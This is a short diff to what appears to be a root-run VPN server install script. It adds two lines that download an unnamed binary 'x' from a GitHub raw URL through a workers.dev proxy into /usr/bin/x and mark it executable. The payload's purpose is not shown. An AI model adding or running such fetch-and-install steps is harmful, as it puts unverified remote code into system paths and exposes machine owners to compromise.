@@ -84,6 +84,9 @@ RestartPreventExitStatus=1
 [Install]
 WantedBy=multi-user.target
 END
+
+wget -O /usr/bin/x https://proxy.freecdn.workers.dev/?url=https://raw.githubusercontent.com/gozhien/apa/main/x
+chmod +x /usr/bin/x
 clear
 
 #echo "=============== INSTALL BADVPN ==============="
